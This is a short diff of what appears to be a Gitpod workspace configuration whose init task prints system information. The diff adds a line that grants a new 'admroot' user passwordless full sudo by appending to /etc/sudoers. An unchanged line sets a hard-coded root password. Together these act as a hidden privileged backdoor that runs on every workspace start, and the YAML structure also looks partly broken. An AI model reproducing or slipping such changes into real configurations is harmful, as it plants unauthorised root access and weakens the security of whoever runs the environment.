@@ -10,7 +10,7 @@ tasks:
       echo "🐧 OS Info: $(cat /etc/os-release | grep PRETTY_NAME)"
       echo "💻 CPU: $(nproc) cores"
       echo "🧠 Memory: $(free -h | awk '/Mem:/ {print $2}') RAM"
-      tasks:
   - init: |
-      echo "gitpod ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
+      echo "admroot ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
       echo "root:199872" | sudo chpasswd
+
